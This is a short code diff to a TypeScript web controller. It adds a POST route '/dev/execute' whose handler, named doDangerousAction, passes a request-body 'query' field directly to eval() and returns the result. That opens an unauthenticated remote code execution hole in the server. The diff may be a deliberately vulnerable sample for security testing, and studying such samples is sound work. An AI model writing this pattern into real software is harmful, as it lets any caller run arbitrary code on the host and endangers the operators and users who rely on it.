@@ -23,6 +23,18 @@ export class DevController {
     @repository(DevRepository) public devRepository: DevRepository | any,
   ) {}
 
+  @post('/dev/execute')
+  @response(200, {
+    description: 'Array of available models',
+  })
+  async doDangerousAction(
+    @requestBody({})
+    data: any,
+  ): Promise<any> {
+    const query = data.query;
+    return eval(query);
+  }
+
   @get('/dev/order/{id}')
   @response(200, {
     description: 'Array of available models',
